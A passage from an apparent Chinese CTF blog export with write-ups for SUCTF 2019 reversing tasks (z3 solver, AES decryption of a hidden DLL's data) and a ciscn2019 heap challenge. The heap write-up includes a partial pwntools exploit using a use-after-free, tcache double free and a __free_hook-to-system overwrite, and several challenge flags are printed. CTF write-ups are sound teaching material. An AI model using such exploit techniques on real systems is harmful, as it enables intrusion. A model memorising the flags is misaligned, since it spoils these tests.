int)(*(v0 + 21))) + ((unsigned int)(*(v0 + 22))) - ((unsigned int)(*(v0 + 23))) + ((unsigned int)(*(v0 + &amp;loc_18))) - ((unsigned int)(*(v0 + 25))) + ((unsigned int)(*(v0 + 26))) + ((unsigned int)(*(v0 + 27))) - ((unsigned int)(*(v0 + &amp;loc_1C))) + ((unsigned int)(*(v0 + 29))) - ((unsigned int)(*(v0 + 30))) + ((unsigned int)(*(v0 + 31))) + (((unsigned int)(*(v0 + &amp;loc_20))) + ((unsigned int)(*(v0 + 33)))) - ((unsigned int)(*(v0 + 34))) - ((unsigned int)(*(v0 + 35))) - ((unsigned int)(*(v0 + &amp;loc_24))) + ((unsigned int)(*(v0 + 37))) - ((unsigned int)(*(v0 + 38))) - ((unsigned int)(*(v0 + 39))) + ((unsigned int)(*(v0 + &amp;loc_28))) + ((unsigned int)(*(v0 + 41))); 省略了部分代码，可以看出是对输入进行加密后，再通过输入的42位加减计算来得到输出，最终输出来与main函数里的数组进行比较，所以就变成了一个求解42元1次方程组的问题： 贴上我的z3脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from z3 import *flag=[BitVec(&apos;flag%d&apos;%i,8)for i in range(42)]s=[-108,-200,294,-216,-1008,660,-866,1770,220,6,-244,-522,-1406,-816,386,990,334,690,-1832,372,-1370,-1580,450,-1668,858,326,-196,-1516,462,2012,-696,152,2142,-592,-68,878,-178,-1994,1472,1710,1684,34]solver=Solver()solver.add(flag[1]+flag[2]+flag[0]-flag[3]+flag[4]-flag[5]-flag[6]-flag[7]-flag[8]+flag[9]+flag[10]-flag[11]+flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]+flag[18]+flag[19]-flag[20]+flag[21]+flag[22]+flag[23]+flag[24]-flag[25]+flag[26]-flag[27]+flag[28]+flag[29]-flag[30]-flag[31]+flag[32]-flag[33]+flag[34]+flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[0])solver.add(flag[0]-flag[1]+flag[2]-flag[3]-flag[4]+flag[5]-flag[6]-flag[7]-flag[8]-flag[9]+flag[10]-flag[11]+flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]+flag[18]-flag[19]+flag[20]+flag[21]-flag[22]-flag[23]-flag[24]+flag[25]-flag[26]+flag[27]-flag[28]-flag[29]+flag[30]+flag[31]+flag[32]+flag[33]+flag[34]+flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[1])solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]+flag[5]-flag[6]-flag[7]+flag[8]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]+flag[14]-flag[15]-flag[16]+flag[17]+flag[18]+flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]+flag[25]+flag[26]-flag[27]+flag[28]-flag[29]+flag[30]-flag[31]+flag[32]+flag[33]-flag[34]-flag[35]+flag[36]+flag[37]+flag[38]-flag[39]+flag[40]-flag[41]==s[2])solver.add(flag[0]-flag[1]-flag[2]-flag[3]-flag[4]-flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]-flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]-flag[21]+flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]+flag[34]-flag[35]+flag[36]+flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[3])solver.add(flag[0]-flag[1]-flag[2]+flag[3]-flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]-flag[10]+flag[11]+flag[12]-flag[13]+flag[14]-flag[15]+flag[16]+flag[17]-flag[18]+flag[19]-flag[20]+flag[21]-flag[22]-flag[23]-flag[24]+flag[25]-flag[26]-flag[27]-flag[28]+flag[29]+flag[30]+flag[31]-flag[32]+flag[33]-flag[34]-flag[35]+flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[4])solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[7]+flag[8]+flag[0]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]-flag[14]+flag[15]-flag[16]+flag[17]-flag[18]+flag[19]+flag[20]-flag[21]+flag[22]-flag[23]+flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]-flag[30]+flag[31]+flag[32]+flag[33]-flag[34]-flag[35]-flag[36]+flag[37]-flag[38]-flag[39]+flag[40]+flag[41]==s[5])solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]-flag[10]+flag[11]+flag[12]-flag[13]+flag[14]+flag[15]+flag[16]+flag[17]-flag[18]-flag[19]-flag[20]-flag[21]-flag[22]-flag[23]+flag[24]+flag[25]-flag[26]+flag[27]+flag[28]+flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]+flag[36]+flag[37]-flag[38]-flag[39]+flag[40]-flag[41]==s[6])solver.add(flag[1]+flag[0]-flag[2]-flag[3]-flag[4]+flag[5]+flag[6]-flag[7]+flag[8]+flag[9]-flag[10]+flag[11]-flag[12]+flag[13]-flag[14]+flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]+flag[25]-flag[26]+flag[27]+flag[28]+flag[29]+flag[30]+flag[31]+flag[32]-flag[33]+flag[34]-flag[35]+flag[36]+flag[37]+flag[38]+flag[39]-flag[40]-flag[41]==s[7])solver.add(flag[0]-flag[1]-flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]+flag[10]-flag[11]-flag[12]+flag[13]-flag[14]+flag[15]+flag[16]+flag[17]+flag[18]-flag[19]+flag[20]+flag[21]-flag[22]-flag[23]+flag[24]+flag[25]+flag[26]-flag[27]+flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]+flag[34]-flag[35]-flag[36]+flag[37]-flag[38]-flag[39]+flag[40]-flag[41]==s[8])solver.add(flag[1]+flag[2]+flag[0]-flag[3]+flag[4]+flag[5]+flag[6]-flag[7]-flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]+flag[15]+flag[16]-flag[17]-flag[18]+flag[19]+flag[20]-flag[21]-flag[22]-flag[23]+flag[24]-flag[25]-flag[26]-flag[27]+flag[28]+flag[29]+flag[30]-flag[31]+flag[32]+flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[9])solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]-flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]+flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]-flag[25]+flag[26]-flag[27]-flag[28]+flag[29]-flag[30]+flag[31]+flag[32]-flag[33]-flag[34]+flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[10])solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]-flag[8]+flag[9]+flag[10]-flag[11]-flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]-flag[18]+flag[19]+flag[20]-flag[21]+flag[22]-flag[23]+flag[24]+flag[25]+flag[26]+flag[27]-flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]+flag[36]+flag[37]-flag[38]-flag[39]-flag[40]-flag[41]==s[11])solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]-flag[5]-flag[6]+flag[7]+flag[8]-flag[9]+flag[10]-flag[11]-flag[12]-flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]-flag[19]-flag[20]-flag[21]-flag[22]+flag[23]-flag[24]+flag[25]-flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]+flag[32]+flag[33]+flag[34]-flag[35]-flag[36]-flag[37]-flag[38]+flag[39]-flag[40]-flag[41]==s[12])solver.add(flag[0]-flag[1]+flag[2]-flag[3]+flag[4]-flag[5]+flag[6]-flag[7]+flag[8]-flag[9]+flag[10]-flag[11]+flag[12]+flag[13]+flag[14]+flag[15]-flag[16]-flag[17]-flag[18]+flag[19]+flag[20]+flag[21]-flag[22]-flag[23]+flag[24]+flag[25]-flag[26]-flag[27]+flag[28]+flag[29]-flag[30]-flag[31]-flag[32]+flag[33]-flag[34]-flag[35]+flag[36]-flag[37]-flag[38]-flag[39]+flag[40]-flag[41]==s[13])solver.add(flag[1]+flag[2]+flag[0]-flag[3]-flag[4]-flag[5]+flag[6]-flag[7]+flag[8]+flag[9]+flag[10]-flag[11]+flag[12]-flag[13]-flag[14]+flag[15]+flag[16]+flag[17]-flag[18]-flag[19]-flag[20]-flag[21]+flag[22]+flag[23]+flag[24]-flag[25]+flag[26]+flag[27]+flag[28]-flag[29]-flag[30]-flag[31]+flag[32]+flag[33]+flag[34]+flag[35]+flag[36]+flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[14])solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]+flag[5]-flag[6]+flag[7]-flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]-flag[15]-flag[16]+flag[17]-flag[18]-flag[19]-flag[20]-flag[21]+flag[22]+flag[23]+flag[24]+flag[25]+flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]+flag[32]-flag[33]+flag[34]+flag[35]+flag[36]+flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[15])solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]-flag[5]+flag[6]+flag[7]+flag[8]+flag[9]+flag[10]-flag[11]+flag[12]-flag[13]+flag[14]+flag[15]+flag[16]-flag[17]+flag[18]-flag[19]+flag[20]-flag[21]-flag[22]-flag[23]-flag[24]-flag[25]+flag[26]+flag[27]+flag[28]+flag[29]-flag[30]-flag[31]+flag[32]-flag[33]-flag[34]+flag[35]-flag[36]+flag[37]-flag[38]+flag[39]-flag[40]+flag[41]==s[16])solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[0]-flag[5]+flag[6]+flag[7]+flag[8]-flag[9]-flag[10]+flag[11]-flag[12]+flag[13]+flag[14]+flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]+flag[25]-flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]+flag[32]-flag[33]-flag[34]+flag[35]-flag[36]+flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[17])solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]+flag[5]-flag[6]+flag[7]-flag[8]+flag[9]+flag[10]-flag[11]-flag[12]-flag[13]+flag[14]-flag[15]-flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]-flag[22]-flag[23]-flag[24]-flag[25]-flag[26]-flag[27]+flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]+flag[34]-flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[18])solver.add(flag[1]+flag[2]+flag[3]+flag[0]-flag[4]-flag[5]+flag[6]-flag[7]-flag[8]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]+flag[14]+flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]+flag[30]+flag[31]+flag[32]+flag[33]-flag[34]+flag[35]-flag[36]-flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[19])solver.add(flag[1]+flag[0]-flag[2]-flag[3]-flag[4]+flag[5]-flag[6]+flag[7]-flag[8]-flag[9]+flag[10]+flag[11]-flag[12]-flag[13]+flag[14]-flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]-flag[25]-flag[26]-flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]+flag[33]-flag[34]+flag[35]+flag[36]-flag[37]+flag[38]-flag[39]+flag[40]-flag[41]==s[20])solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]+flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]-flag[12]-flag[13]-flag[14]-flag[15]-flag[16]+flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]+flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[21])solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[7]+flag[0]-flag[8]+flag[9]-flag[10]+flag[11]-flag[12]+flag[13]+flag[14]+flag[15]-flag[16]+flag[17]+flag[18]-flag[19]-flag[20]+flag[21]+flag[22]-flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]+flag[29]+flag[30]+flag[31]-flag[32]+flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[22])solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]-flag[5]-flag[6]-flag[7]+flag[8]-flag[9]-flag[10]+flag[11]+flag[12]-flag[13]-flag[14]+flag[15]-flag[16]-flag[17]+flag[18]+flag[19]-flag[20]-flag[21]+flag[22]-flag[23]+flag[24]+flag[25]-flag[26]+flag[27]-flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[23])solver.add(flag[1]+flag[0]-flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]-flag[8]+flag[9]+flag[10]-flag[11]-flag[12]-flag[13]-flag[14]+flag[15]+flag[16]+flag[17]-flag[18]+flag[19]+flag[20]+flag[21]+flag[22]+flag[23]+flag[24]+flag[25]-flag[26]-flag[27]-flag[28]+flag[29]+flag[30]-flag[31]+flag[32]+flag[33]+flag[34]-flag[35]-flag[36]-flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[24])solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]+flag[5]+flag[6]-flag[7]+flag[8]+flag[9]+flag[10]-flag[11]-flag[12]+flag[13]-flag[14]+flag[15]-flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]+flag[22]+flag[23]-flag[24]-flag[25]+flag[26]-flag[27]+flag[28]-flag[29]+flag[30]-flag[31]-flag[32]+flag[33]-flag[34]-flag[35]-flag[36]-flag[37]+flag[38]-flag[39]+flag[40]+flag[41]==s[25])solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[0]-flag[5]-flag[6]+flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]-flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]-flag[19]-flag[20]+flag[21]+flag[22]+flag[23]+flag[24]+flag[25]-flag[26]-flag[27]-flag[28]-flag[29]+flag[30]+flag[31]-flag[32]-flag[33]-flag[34]+flag[35]+flag[36]-flag[37]-flag[38]+flag[39]+flag[40]+flag[41]==s[26])solver.add(flag[0]-flag[1]+flag[2]-flag[3]+flag[4]-flag[5]-flag[6]-flag[7]-flag[8]-flag[9]-flag[10]-flag[11]+flag[12]+flag[13]-flag[14]+flag[15]+flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]-flag[22]-flag[23]+flag[24]+flag[25]+flag[26]-flag[27]+flag[28]+flag[29]+flag[30]-flag[31]-flag[32]-flag[33]-flag[34]+flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]-flag[41]==s[27])solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]+flag[6]+flag[7]-flag[8]-flag[9]+flag[10]+flag[11]-flag[12]+flag[13]-flag[14]+flag[15]-flag[16]+flag[17]+flag[18]+flag[19]-flag[20]-flag[21]+flag[22]-flag[23]-flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]-flag[30]+flag[31]-flag[32]-flag[33]+flag[34]+flag[35]+flag[36]-flag[37]-flag[38]+flag[39]+flag[40]+flag[41]==s[28])solver.add(flag[1]+flag[0]-flag[2]-flag[3]-flag[4]+flag[5]+flag[6]+flag[7]-flag[8]+flag[9]-flag[10]-flag[11]+flag[12]-flag[13]+flag[14]+flag[15]-flag[16]+flag[17]+flag[18]-flag[19]+flag[20]+flag[21]+flag[22]+flag[23]-flag[24]+flag[25]+flag[26]-flag[27]+flag[28]+flag[29]+flag[30]+flag[31]+flag[32]-flag[33]-flag[34]+flag[35]+flag[36]-flag[37]+flag[38]+flag[39]-flag[40]+flag[41]==s[29])solver.add(flag[1]+flag[2]+flag[3]+flag[0]-flag[4]-flag[5]-flag[6]-flag[7]+flag[8]+flag[9]-flag[10]-flag[11]-flag[12]+flag[13]-flag[14]-flag[15]+flag[16]-flag[17]-flag[18]-flag[19]+flag[20]-flag[21]-flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]+flag[35]+flag[36]+flag[37]-flag[38]+flag[39]+flag[40]+flag[41]==s[30])solver.add(flag[1]+flag[0]-flag[2]+flag[3]+flag[4]-flag[5]-flag[6]+flag[7]+flag[8]+flag[9]+flag[10]+flag[11]+flag[12]-flag[13]-flag[14]-flag[15]+flag[16]+flag[17]+flag[18]+flag[19]-flag[20]+flag[21]-flag[22]+flag[23]-flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]-flag[32]+flag[33]-flag[34]+flag[35]-flag[36]+flag[37]-flag[38]+flag[39]-flag[40]-flag[41]==s[31])solver.add(flag[0]-flag[1]+flag[2]+flag[3]-flag[4]+flag[5]+flag[6]+flag[7]+flag[8]-flag[9]+flag[10]+flag[11]-flag[12]+flag[13]+flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]+flag[20]-flag[21]-flag[22]+flag[23]-flag[24]+flag[25]+flag[26]+flag[27]-flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]+flag[34]+flag[35]+flag[36]+flag[37]-flag[38]+flag[39]-flag[40]+flag[41]==s[32])solver.add(flag[0]-flag[1]-flag[2]+flag[3]+flag[4]+flag[5]+flag[6]-flag[7]-flag[8]+flag[9]+flag[10]+flag[11]-flag[12]-flag[13]+flag[14]+flag[15]-flag[16]+flag[17]-flag[18]+flag[19]-flag[20]+flag[21]+flag[22]+flag[23]-flag[24]-flag[25]+flag[26]+flag[27]-flag[28]+flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]+flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[33])solver.add(flag[1]+flag[0]-flag[2]+flag[3]-flag[4]-flag[5]-flag[6]+flag[7]+flag[8]+flag[9]+flag[10]+flag[11]-flag[12]-flag[13]-flag[14]+flag[15]-flag[16]+flag[17]-flag[18]+flag[19]-flag[20]-flag[21]+flag[22]+flag[23]-flag[24]-flag[25]+flag[26]+flag[27]+flag[28]+flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]+flag[37]+flag[38]+flag[39]-flag[40]-flag[41]==s[34])solver.add(flag[0]-flag[1]+flag[2]+flag[3]+flag[4]-flag[5]-flag[6]+flag[7]+flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]-flag[15]+flag[16]-flag[17]+flag[18]+flag[19]-flag[20]-flag[21]-flag[22]+flag[23]+flag[24]-flag[25]-flag[26]+flag[27]+flag[28]-flag[29]-flag[30]+flag[31]+flag[32]-flag[33]+flag[34]+flag[35]+flag[36]+flag[37]+flag[38]+flag[39]-flag[40]-flag[41]==s[35])solver.add(flag[1]+flag[2]+flag[0]-flag[3]-flag[4]-flag[5]-flag[6]+flag[7]+flag[8]+flag[9]-flag[10]+flag[11]+flag[12]-flag[13]+flag[14]+flag[15]+flag[16]+flag[17]+flag[18]+flag[19]+flag[20]+flag[21]-flag[22]-flag[23]+flag[24]-flag[25]-flag[26]-flag[27]-flag[28]+flag[29]+flag[30]+flag[31]+flag[32]-flag[33]-flag[34]-flag[35]-flag[36]+flag[37]-flag[38]+flag[39]+flag[40]-flag[41]==s[36])solver.add(flag[0]-flag[1]-flag[2]+flag[3]-flag[4]+flag[5]-flag[6]-flag[7]-flag[8]-flag[9]+flag[10]-flag[11]-flag[12]-flag[13]-flag[14]-flag[15]-flag[16]+flag[17]+flag[18]-flag[19]-flag[20]-flag[21]+flag[22]-flag[23]+flag[24]-flag[25]-flag[26]+flag[27]-flag[28]-flag[29]+flag[30]+flag[31]-flag[32]+flag[33]-flag[34]+flag[35]-flag[36]-flag[37]+flag[38]-flag[39]-flag[40]-flag[41]==s[37])solver.add(flag[1]+flag[2]+flag[3]+flag[0]-flag[4]+flag[5]+flag[6]+flag[7]-flag[8]-flag[9]-flag[10]+flag[11]+flag[12]+flag[13]-flag[14]-flag[15]-flag[16]-flag[17]-flag[18]-flag[19]+flag[20]+flag[21]-flag[22]+flag[23]+flag[24]+flag[25]+flag[26]+flag[27]-flag[28]-flag[29]+flag[30]+flag[31]-flag[32]-flag[33]+flag[34]-flag[35]-flag[36]-flag[37]+flag[38]+flag[39]+flag[40]-flag[41]==s[38])solver.add(flag[0]-flag[1]-flag[2]-flag[3]-flag[4]+flag[5]-flag[6]-flag[7]-flag[8]+flag[9]-flag[10]+flag[11]-flag[12]+flag[13]+flag[14]-flag[15]-flag[16]-flag[17]+flag[18]+flag[19]+flag[20]+flag[21]+flag[22]-flag[23]+flag[24]+flag[25]+flag[26]+flag[27]+flag[28]-flag[29]+flag[30]+flag[31]+flag[32]+flag[33]+flag[34]-flag[35]-flag[36]+flag[37]+flag[38]+flag[39]-flag[40]+flag[41]==s[39])solver.add(flag[0]-flag[1]-flag[2]-flag[3]+flag[4]+flag[5]+flag[6]-flag[7]+flag[8]+flag[9]-flag[10]+flag[11]-flag[12]-flag[13]-flag[14]+flag[15]+flag[16]+flag[17]+flag[18]+flag[19]+flag[20]+flag[21]+flag[22]-flag[23]+flag[24]+flag[25]-flag[26]+flag[27]+flag[28]-flag[29]+flag[30]+flag[31]+flag[32]-flag[33]-flag[34]+flag[35]+flag[36]-flag[37]+flag[38]+flag[39]+flag[40]+flag[41]==s[40])solver.add(flag[1]+flag[2]+flag[3]+flag[4]+flag[5]+flag[6]+flag[0]-flag[7]-flag[8]-flag[9]+flag[10]+flag[11]-flag[12]+flag[13]-flag[14]-flag[15]-flag[16]-flag[17]-flag[18]-flag[19]+flag[20]-flag[21]+flag[22]-flag[23]-flag[24]+flag[25]+flag[26]+flag[27]+flag[28]-flag[29]-flag[30]-flag[31]-flag[32]-flag[33]-flag[34]-flag[35]-flag[36]-flag[37]-flag[38]-flag[39]-flag[40]+flag[41]==s[41])if solver.check()==sat: print solver.model() 不过解了半天也没解出来2333，最后是密码学大佬yx解的方程， (换成Int就解出来了) 最后再逆运算一下得到flag 1234567s2=[154, 171, 24, 161, 54, 222, 172, 116, 129, 18, 139, 152, 127, 247, 36, 124, 43, 90, 97, 138, 238, 95, 141, 237, 26, 227, 152, 154, 167, 54, 141, 166, 139, 66, 216, 129, 94, 164, 69, 188, 33, 194]for i in range(len(s2)): s2[i]^=i s2[i]=(s2[i]&gt;&gt;3)|(s2[i]&lt;&lt;5) s2[i]=s2[i]&amp;0xffprint &apos;&apos;.join([chr(i) for i in s2])#SUCTF&#123;Un1c0rn_Engin3_Is_@_P0wer7ul_TO0ls!&#125;","categories":[],"tags":[]},{"title":"SUCTF2019-hardCPP","slug":"SUCTF2019-hardCPP","date":"2019-08-19T13:00:00.000Z","updated":"2019-08-18T13:13:58.892Z","comments":true,"path":"2019/08/19/SUCTF2019-hardCPP/","link":"","permalink":"http://yoursite.com/2019/08/19/SUCTF2019-hardCPP/","excerpt":"🏄","text":"🏄 输入点： 12345678910111213memset(&amp;v4, 0, 0x13ui64);memset(&amp;Dst, 0, 0x6Dui64);memcpy(&amp;Dst, aJLJLJL1pzxcp6b, 0x6Cui64);for ( i = 0; (unsigned __int64)i &lt; 0x6C; ++i ) aJLJLJL1pzxcp6b[i] ^= key[0];puts(aJLJLJL1pzxcp6b);sub_7FF7D6BC9FF0((__int64)&quot;%18s&quot;, &amp;v4, 19i64);// Akira_aut0_ch3ss_!if ( sub_7FF7D6BC9200((__int64)&amp;v4) )&#123; sub_7FF7D6BC8300((__int64)&amp;v3, 2i64, 1048579); sub_7FF7D6BC6C10(qword_7FF7D6BD6178, v3, (__int64)&amp;v4); v1 = 1;&#125; 输出的字符串储存时都是加密的，通过异或可以得到程序中输出的字符串。 这里要求输入password，逆出password为Akira_aut0_ch3ss_!，但是此时会提示Have no sign! 后发现对byte_7FF7D6BD11A0处分组异或得到了DLL文件，并且程序会与其share memory。 提取出DLL： 1234567891011121314151617181920212223242526272829303132memset(&amp;Str2, 0, 0x11ui64);puts(&quot;Now check the sign:&quot;);sub_1800027A0((__int64)&quot;%32s&quot;, &amp;Str2);hHandle = OpenEventW(0x1F0003u, 1, L&quot;DLLInput&quot;);if ( !hHandle ) return 0;WaitForSingleObject(hHandle, 0xFFFFFFFF);CloseHandle(hHandle);hFileMappingObject = OpenFileMappingW(0xF001Fu, 0, L&quot;ShareMemory&quot;);// src=[0x94,0xBF,0x7A,0xC,0xA4,0x35,0x50,0xD1,0xC2,0x15,0xEC,0xEF,0x9D,0x9A,0xAA,0x56,]if ( !hFileMappingObject ) return 0;Src = MapViewOfFile(hFileMappingObject, 4u, 0, 0, 0x8000ui64);if ( Src )&#123; CloseHandle(hFileMappingObject); Dst = malloc(0x8000ui64); memset(Dst, 0, 0x8000ui64); memcpy(Dst, Src, 0x8000ui64); strcpy(&amp;v7, &quot;Ak1i3aS3cre7K3y&quot;); memset(&amp;Str1, 0, 0x11ui64); sub_180002800((__int64)&amp;v7, &amp;Str1, Dst); if ( !strcmp(&amp;Str1, &amp;Str2) ) sub_1800026F0((__int64)&quot;Get finally answer!\\n&quot;); else sub_1800026F0((__int64)&quot;wow... game start!\\n&quot;); result = 1;&#125;else&#123; CloseHandle(hFileMappingObject); result = 0;&#125; 观察到输入与之前share的memory中的数据通过sub_180002800后进行比较。跟进sub_180002800： 12345Src = a3;Dst = a2;initkey((__int64)&amp;v3, a1);memcpy(Dst, Src, 0x10ui64);Concurrency::details::HardwareAffinity::ApplyTo((Concurrency::details::HardwareAffinity *)&amp;v3, Dst); 发现是以Ak1i3aS3cre7K3y为密钥对share的memory中的数据进行解密，然后输入并没有产生变化，因此只需要aes解密就可以得到flag。 aes解密： 123456789101112from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexdef decrypt(text): key = &apos;Ak1i3aS3cre7K3y\\x00&apos; iv = b&apos;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&apos; mode = AES.MODE_CBC cryptos = AES.new(key, mode, iv) plain_text = cryptos.decrypt(a2b_hex(text)) return bytes.decode(plain_text).rstrip(&apos;/0&apos;)dd=&quot;94BF7A0CA43550D1C215ECEF9D9AAA56&quot;print decrypt(dd)#flag&#123;Ak1rAWin!&#125;","categories":[],"tags":[]},{"title":"ciscn2019-c06","slug":"ciscn2019-c06","date":"2019-08-09T14:54:48.000Z","updated":"2019-08-09T15:09:08.684Z","comments":true,"path":"2019/08/09/ciscn2019-c06/","link":"","permalink":"http://yoursite.com/2019/08/09/ciscn2019-c06/","excerpt":"国赛时坐在五号机旁边看着他搓出来的，五号机tql","text":"国赛时坐在五号机旁边看着他搓出来的，五号机tql 简单分析1234welcome to babyheap1. add2. removechoice &gt; C++写的程序，只有add和remove两个功能，但是在add时会打印出分配的堆地址。remove的时候free之后没有置0，存在UAF。 此外，C++程序会为cin和cout分配两个堆，这一题就是利用double free tcache申请到cout的堆，free之后直接进入unsortedbin。再利用add时打印地址leak出main_arena的地址。 之后就是常规的修改freehook为system，free一个内容为/bin/sh的chunk。 EXP1from pwn import * #sh = process(&apos;./ciscn_final_3.dms&apos;) libc = ELF(&apos;./libc.so.6&apos;) sh = remote(&quot;f.buuoj.cn&quot;,20232) def add(index, size, s): sh.sendlineafter(&apos;choice &gt;&apos;, &apos;1&apos;) sh.sendlineafter(&apos;input the index&apos;, str(index)) sh.sendlineafter(&apos;input the size&apos;, str(size)) sh.sendafter(&apos;now you can write something&apos;, s) def delete(index): sh.sendlineafter(&apos;choice &gt;&apos;, &apos;2&apos;) sh.sendlineafter(&apos;input the index&apos;, str(index)) add(0,0x70,&quot;/bin/sh\\x00&quot;) sh.recvuntil(&quot;gift :&quot;) chunk0addr=int(sh.recv(14),16) leakchunk=chunk0addr-0x11c20 log.success(&quot;leakchunkaddr: &quot;+hex(leakchunk)) add(1,0x10,&quot;1&quot;) delete(1) delete(1) add(2,0x10,p64(leakchunk+0x10)) add(3,0x10,&apos;3&apos;) add(4,0x10,&apos;leakchunk1&apos;) add(5,0x20,&apos;5&apos;) delete(4) delete(5) delete(5) add(6,0x20,p64(leakchunk+0x10)) add(7,0x20,&apos;7&apos;) add(8,0x20,&apos;8&apos;) add(9,0x20,&apos;leakchunk2&apos;) sh.recvuntil(&quot;gift :&quot;) leakchunk2addr=int(sh.recv(14),16) freehook=leakchunk2addr+0x1c48 log.success(&quot;freehook: &quot;+hex(freehook)) 